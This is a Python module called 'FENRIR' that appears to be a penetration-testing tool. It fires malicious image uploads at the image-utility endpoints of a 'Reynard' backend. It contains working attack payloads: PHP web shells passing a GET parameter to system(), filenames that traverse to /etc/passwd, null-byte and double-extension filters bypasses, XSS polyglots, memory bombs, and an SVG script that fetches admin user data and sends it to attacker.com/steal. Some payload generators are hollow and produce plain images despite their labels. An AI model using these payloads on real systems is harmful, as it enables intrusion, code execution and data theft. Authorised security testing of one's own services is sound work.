"""üê∫ FENRIR - Image Utils Exploitation Module

Advanced exploitation targeting image processing and utility services
in the Reynard backend. This module focuses on malicious image uploads,
format manipulation, and image-based attack vectors.
"""

import asyncio
import io
import json
import logging
import time
from dataclasses import dataclass
from typing import Any

import aiohttp
from PIL import Image, ImageDraw

logger = logging.getLogger(__name__)


@dataclass
class ImageAttackPayload:
    """Represents an image-based attack payload."""

    name: str
    description: str
    endpoint: str
    image_data: bytes
    filename: str
    content_type: str
    attack_type: str
    severity: str
    expected_indicators: list[str]


@dataclass
class ImageExploitResult:
    """Results from an image exploitation attempt."""

    attack_name: str
    success: bool
    response_data: dict[str, Any]
    response_time: float
    file_size: int
    error_message: str | None = None
    security_indicators: list[str] = None


class ImageUtilsExploiter:
    """üê∫ Advanced image processing exploitation framework.

    This class implements sophisticated attacks against image processing services:
    - Malicious image upload and processing
    - Image format manipulation and confusion
    - Steganographic payload delivery
    - Image metadata injection attacks
    - Memory exhaustion through image bombs
    - Path traversal via image filenames
    """

    def __init__(self, base_url: str = "http://localhost:8000", auth_token: str = None):
        self.base_url = base_url.rstrip("/")
        self.auth_token = auth_token
        self.session: aiohttp.ClientSession | None = None
        self.exploit_results: list[ImageExploitResult] = []

        # üê∫ Image exploitation statistics
        self.stats = {
            "total_attacks": 0,
            "successful_exploits": 0,
            "malicious_uploads": 0,
            "format_confusions": 0,
            "memory_bombs": 0,
            "path_traversals": 0,
            "metadata_injections": 0,
        }

    async def __aenter__(self):
        """Async context manager entry."""
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=90),
            headers={
                "Authorization": f"Bearer {self.auth_token}" if self.auth_token else "",
                "User-Agent": "FENRIR-Image-Hunter/1.0",
            },
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        if self.session:
            await self.session.close()

    def create_malicious_image(self, attack_type: str) -> bytes:
        """üê∫ Create malicious images for various attack vectors.

        Args:
            attack_type: Type of malicious image to create

        Returns:
            Malicious image data as bytes

        """
        if attack_type == "memory_bomb":
            # Create a large image to exhaust memory
            img = Image.new("RGB", (10000, 10000), color="red")

        elif attack_type == "zip_bomb":
            # Create a small image that expands massively when processed
            img = Image.new("RGB", (1, 1), color="white")

        elif attack_type == "polyglot":
            # Create an image that's also valid HTML/JS
            img = Image.new("RGB", (100, 100), color="blue")

        elif attack_type == "steganographic":
            # Hide malicious payload in image data
            img = Image.new("RGB", (200, 200), color="green")
            draw = ImageDraw.Draw(img)
            # Hide script tag in pixel data
            draw.text((10, 10), "<script>alert('XSS')</script>", fill="black")

        elif attack_type == "metadata_injection":
            # Create image with malicious metadata
            img = Image.new("RGB", (150, 150), color="yellow")

        else:
            # Default malicious image
            img = Image.new("RGB", (100, 100), color="red")

        # Convert to bytes
        img_buffer = io.BytesIO()
        img.save(img_buffer, format="PNG")
        return img_buffer.getvalue()

    def get_malicious_upload_payloads(self) -> list[ImageAttackPayload]:
        """üê∫ Generate malicious image upload attack payloads.

        These payloads attempt to exploit image processing vulnerabilities
        through various malicious image formats and content.
        """
        return [
            ImageAttackPayload(
                name="image_memory_bomb",
                description="Upload massive image to exhaust server memory",
                endpoint="/api/image-utils/process",
                image_data=self.create_malicious_image("memory_bomb"),
                filename="memory_bomb.png",
                content_type="image/png",
                attack_type="memory_exhaustion",
                severity="high",
                expected_indicators=["memory", "large", "processed"],
            ),
            ImageAttackPayload(
                name="zip_bomb_image",
                description="Upload compressed image that expands massively",
                endpoint="/api/image-utils/process",
                image_data=self.create_malicious_image("zip_bomb"),
                filename="zip_bomb.png",
                content_type="image/png",
                attack_type="zip_bomb",
                severity="medium",
                expected_indicators=["compressed", "expanded", "processing"],
            ),
            ImageAttackPayload(
                name="polyglot_image_script",
                description="Upload polyglot file that's both image and script",
                endpoint="/api/image-utils/upload",
                image_data=b'\x89PNG\r\n\x1a\n<script>alert("XSS")</script>',
                filename="polyglot.png",
                content_type="image/png",
                attack_type="polyglot",
                severity="high",
                expected_indicators=["script", "polyglot", "html"],
            ),
            ImageAttackPayload(
                name="steganographic_payload",
                description="Hide malicious payload in image steganography",
                endpoint="/api/image-utils/analyze",
                image_data=self.create_malicious_image("steganographic"),
                filename="hidden_payload.png",
                content_type="image/png",
                attack_type="steganography",
                severity="medium",
                expected_indicators=["hidden", "payload", "steganography"],
            ),
            ImageAttackPayload(
                name="malformed_image_header",
                description="Upload image with malformed header to trigger parser bugs",
                endpoint="/api/image-utils/validate",
                image_data=b"\x89PNG\r\n\x1a\nMALFORMED_HEADER_DATA" + b"A" * 1000,
                filename="malformed.png",
                content_type="image/png",
                attack_type="parser_confusion",
                severity="medium",
                expected_indicators=["malformed", "parser", "error"],
            ),
        ]

    def get_path_traversal_payloads(self) -> list[ImageAttackPayload]:
        """üê∫ Generate path traversal attack payloads through image filenames.

        These payloads attempt to exploit path traversal vulnerabilities
        in image processing and storage systems.
        """
        return [
            ImageAttackPayload(
                name="filename_path_traversal",
                description="Use path traversal in filename to access restricted files",
                endpoint="/api/image-utils/save",
                image_data=self.create_malicious_image("default"),
                filename="../../../etc/passwd",
                content_type="image/png",
                attack_type="path_traversal",
                severity="critical",
                expected_indicators=["path", "traversal", "etc", "passwd"],
            ),
            ImageAttackPayload(
                name="null_byte_injection",
                description="Inject null bytes in filename to bypass filters",
                endpoint="/api/image-utils/save",
                image_data=self.create_malicious_image("default"),
                filename="image.png\x00.php",
                content_type="image/png",
                attack_type="null_injection",
                severity="high",
                expected_indicators=["null", "byte", "php"],
            ),
            ImageAttackPayload(
                name="unicode_filename_bypass",
                description="Use Unicode characters to bypass filename filters",
                endpoint="/api/image-utils/save",
                image_data=self.create_malicious_image("default"),
                filename="../../–µtc/—Ä–∞ssw‘Å",  # Cyrillic lookalikes
                content_type="image/png",
                attack_type="unicode_bypass",
                severity="medium",
                expected_indicators=["unicode", "bypass", "cyrillic"],
            ),
            ImageAttackPayload(
                name="double_extension_confusion",
                description="Use double extensions to confuse file type detection",
                endpoint="/api/image-utils/upload",
                image_data=b'<?php system($_GET["cmd"]); ?>'
                + self.create_malicious_image("default"),
                filename="innocent.png.php",
                content_type="image/png",
                attack_type="extension_confusion",
                severity="high",
                expected_indicators=["php", "system", "extension"],
            ),
        ]

    def get_format_confusion_payloads(self) -> list[ImageAttackPayload]:
        """üê∫ Generate format confusion attack payloads.

        These payloads attempt to exploit format confusion vulnerabilities
        by mismatching content types, headers, and actual file formats.
        """
        return [
            ImageAttackPayload(
                name="svg_script_injection",
                description="Upload SVG with embedded JavaScript as image",
                endpoint="/api/image-utils/process",
                image_data=b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script><![CDATA[
    fetch('/api/admin/users').then(r => r.json()).then(data => {
      fetch('http://attacker.com/steal', {method: 'POST', body: JSON.stringify(data)});
    });
  ]]></script>
  <rect width="100" height="100" fill="red"/>
</svg>""",
                filename="malicious.svg",
                content_type="image/svg+xml",
                attack_type="svg_injection",
                severity="critical",
                expected_indicators=["script", "fetch", "admin"],
            ),
            ImageAttackPayload(
                name="content_type_mismatch",
                description="Upload PHP script with image content type",
                endpoint="/api/image-utils/upload",
                image_data=b'<?php echo "System compromised!"; system($_GET["cmd"]); ?>',
                filename="backdoor.php",
                content_type="image/jpeg",
                attack_type="content_mismatch",
                severity="critical",
                expected_indicators=["php", "system", "compromised"],
            ),
            ImageAttackPayload(
                name="gif_comment_injection",
                description="Inject malicious content in GIF comment section",
                endpoint="/api/image-utils/analyze",
                image_data=b'GIF89a\x01\x00\x01\x00\x00\x00\x00!comment\x00<script>alert("XSS")</script>\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x04\x01\x00;',
                filename="comment_injection.gif",
                content_type="image/gif",
                attack_type="comment_injection",
                severity="medium",
                expected_indicators=["comment", "script", "alert"],
            ),
            ImageAttackPayload(
                name="webp_metadata_exploit",
                description="Exploit WebP metadata processing vulnerabilities",
                endpoint="/api/image-utils/metadata",
                image_data=b"RIFF\x20\x00\x00\x00WEBPVP8 \x14\x00\x00\x00MALICIOUS_METADATA_PAYLOAD",
                filename="metadata_exploit.webp",
                content_type="image/webp",
                attack_type="metadata_exploit",
                severity="medium",
                expected_indicators=["webp", "metadata", "malicious"],
            ),
        ]

    async def execute_image_attack(
        self, payload: ImageAttackPayload,
    ) -> ImageExploitResult:
        """üê∫ Execute a single image-based attack.

        Args:
            payload: The image attack payload to execute

        Returns:
            Results of the exploitation attempt

        """
        start_time = time.time()
        self.stats["total_attacks"] += 1

        try:
            logger.info(f"üê∫ Executing image attack: {payload.name}")

            # Prepare multipart form data
            form_data = aiohttp.FormData()
            form_data.add_field(
                "file",
                payload.image_data,
                filename=payload.filename,
                content_type=payload.content_type,
            )

            async with self.session.post(
                f"{self.base_url}{payload.endpoint}", data=form_data,
            ) as response:
                response_time = time.time() - start_time

                if response.status in [200, 201, 202]:
                    try:
                        response_data = await response.json()
                    except:
                        response_data = {"response_text": await response.text()}

                    # Analyze response for security indicators
                    security_indicators = []
                    response_str = json.dumps(response_data).lower()

                    for indicator in payload.expected_indicators:
                        if indicator.lower() in response_str:
                            security_indicators.append(indicator)

                    # Check for successful exploitation
                    success = len(security_indicators) > 0

                    if success:
                        self.stats["successful_exploits"] += 1

                        # Categorize by attack type
                        if payload.attack_type in ["memory_exhaustion", "zip_bomb"]:
                            self.stats["memory_bombs"] += 1
                        elif payload.attack_type in [
                            "path_traversal",
                            "null_injection",
                            "unicode_bypass",
                        ]:
                            self.stats["path_traversals"] += 1
                        elif payload.attack_type in [
                            "svg_injection",
                            "content_mismatch",
                            "comment_injection",
                        ]:
                            self.stats["format_confusions"] += 1
                        elif payload.attack_type in [
                            "metadata_exploit",
                            "steganography",
                        ]:
                            self.stats["metadata_injections"] += 1
                        else:
                            self.stats["malicious_uploads"] += 1

                    result = ImageExploitResult(
                        attack_name=payload.name,
                        success=success,
                        response_data=response_data,
                        response_time=response_time,
                        file_size=len(payload.image_data),
                        security_indicators=security_indicators,
                    )

                else:
                    result = ImageExploitResult(
                        attack_name=payload.name,
                        success=False,
                        response_data={},
                        response_time=response_time,
                        file_size=len(payload.image_data),
                        error_message=f"HTTP {response.status}: {await response.text()}",
                    )

        except Exception as e:
            logger.error(f"üê∫ Image attack failed: {e}")
            result = ImageExploitResult(
                attack_name=payload.name,
                success=False,
                response_data={},
                response_time=time.time() - start_time,
                file_size=(
                    len(payload.image_data) if hasattr(payload, "image_data") else 0
                ),
                error_message=str(e),
            )

        self.exploit_results.append(result)
        return result

    async def execute_comprehensive_image_test(self) -> dict[str, Any]:
        """üê∫ Execute comprehensive image processing exploitation test.

        Returns:
            Detailed report of all image attacks and their results

        """
        logger.info(
            "üê∫ FENRIR unleashing comprehensive image processing exploitation test...",
        )

        # Gather all image attack payloads
        all_payloads = []
        all_payloads.extend(self.get_malicious_upload_payloads())
        all_payloads.extend(self.get_path_traversal_payloads())
        all_payloads.extend(self.get_format_confusion_payloads())

        results = []

        for payload in all_payloads:
            result = await self.execute_image_attack(payload)
            results.append(result)

            # üê∫ Brief pause between attacks
            await asyncio.sleep(0.5)

        # Generate comprehensive report
        report = self.generate_image_exploitation_report(results)

        logger.info(
            f"üê∫ Image test complete. Success rate: {self.stats['successful_exploits']}/{self.stats['total_attacks']}",
        )

        return report

    def generate_image_exploitation_report(
        self, results: list[ImageExploitResult],
    ) -> dict[str, Any]:
        """üê∫ Generate comprehensive image exploitation report.

        Args:
            results: List of image exploit results

        Returns:
            Detailed vulnerability assessment report

        """
        successful_attacks = [r for r in results if r.success]
        failed_attacks = [r for r in results if not r.success]

        # Calculate file size statistics
        total_data_uploaded = sum(r.file_size for r in results)
        avg_response_time = (
            sum(r.response_time for r in results) / len(results) if results else 0
        )

        # Identify critical vulnerabilities
        critical_vulns = []
        for result in successful_attacks:
            if "script" in str(result.security_indicators) or "php" in str(
                result.security_indicators,
            ):
                critical_vulns.append(
                    {
                        "type": "Code Injection via Image Processing",
                        "attack": result.attack_name,
                        "indicators": result.security_indicators,
                        "severity": "CRITICAL",
                    },
                )

            if "path" in str(result.security_indicators) or "traversal" in str(
                result.security_indicators,
            ):
                critical_vulns.append(
                    {
                        "type": "Path Traversal via Image Upload",
                        "attack": result.attack_name,
                        "indicators": result.security_indicators,
                        "severity": "HIGH",
                    },
                )

        return {
            "fenrir_image_report": {
                "timestamp": time.time(),
                "target": self.base_url,
                "test_type": "Image Processing Exploitation",
                "summary": {
                    "total_attacks": len(results),
                    "successful_exploits": len(successful_attacks),
                    "malicious_uploads": self.stats["malicious_uploads"],
                    "format_confusions": self.stats["format_confusions"],
                    "memory_bombs": self.stats["memory_bombs"],
                    "path_traversals": self.stats["path_traversals"],
                    "metadata_injections": self.stats["metadata_injections"],
                    "total_data_uploaded_mb": round(
                        total_data_uploaded / (1024 * 1024), 2,
                    ),
                    "avg_response_time": round(avg_response_time, 3),
                    "critical_vulnerabilities": len(critical_vulns),
                },
                "vulnerability_details": critical_vulns,
                "successful_attacks": [
                    {
                        "attack_name": r.attack_name,
                        "file_size_kb": round(r.file_size / 1024, 2),
                        "response_preview": (
                            str(r.response_data)[:200] + "..."
                            if len(str(r.response_data)) > 200
                            else str(r.response_data)
                        ),
                        "security_indicators": r.security_indicators,
                        "response_time": round(r.response_time, 3),
                    }
                    for r in successful_attacks
                ],
                "failed_attacks": [
                    {
                        "attack_name": r.attack_name,
                        "file_size_kb": round(r.file_size / 1024, 2),
                        "error": r.error_message,
                        "response_time": round(r.response_time, 3),
                    }
                    for r in failed_attacks
                ],
                "recommendations": [
                    "üõ°Ô∏è Implement strict file type validation and content verification",
                    "üîí Add comprehensive input sanitization for filenames and metadata",
                    "üö´ Disable server-side image processing for untrusted uploads",
                    "üìä Add file size limits and processing timeouts",
                    "‚ö†Ô∏è Implement sandboxed image processing environments",
                    "üîç Deploy malware scanning for all uploaded files",
                    "üõë Validate image headers and content consistency",
                    "üö® Add monitoring for suspicious image processing patterns",
                ],
                "statistics": self.stats,
            },
        }


async def main():
    """üê∫ Main execution function for standalone testing.
    """
    # Configure for your target
    TARGET_URL = "http://localhost:8000"
    AUTH_TOKEN = None  # Add your JWT token here if needed

    async with ImageUtilsExploiter(TARGET_URL, AUTH_TOKEN) as exploiter:
        report = await exploiter.execute_comprehensive_image_test()

        print("\nüê∫ FENRIR - Image Processing Exploitation Report")
        print("=" * 60)
        print(json.dumps(report["fenrir_image_report"]["summary"], indent=2))

        if report["fenrir_image_report"]["vulnerability_details"]:
            print("\nüö® CRITICAL VULNERABILITIES FOUND:")
            for vuln in report["fenrir_image_report"]["vulnerability_details"]:
                print(f"  - {vuln['type']}: {vuln['attack']}")

        print(
            f"\nüìä Malicious Uploads: {report['fenrir_image_report']['summary']['malicious_uploads']}",
        )
        print(
            f"üé≠ Format Confusions: {report['fenrir_image_report']['summary']['format_confusions']}",
        )
        print(
            f"üí£ Memory Bombs: {report['fenrir_image_report']['summary']['memory_bombs']}",
        )
        print(
            f"üìÅ Path Traversals: {report['fenrir_image_report']['summary']['path_traversals']}",
        )


if __name__ == "__main__":
    # üê∫ Unleash FENRIR's image processing hunting capabilities
    asyncio.run(main())
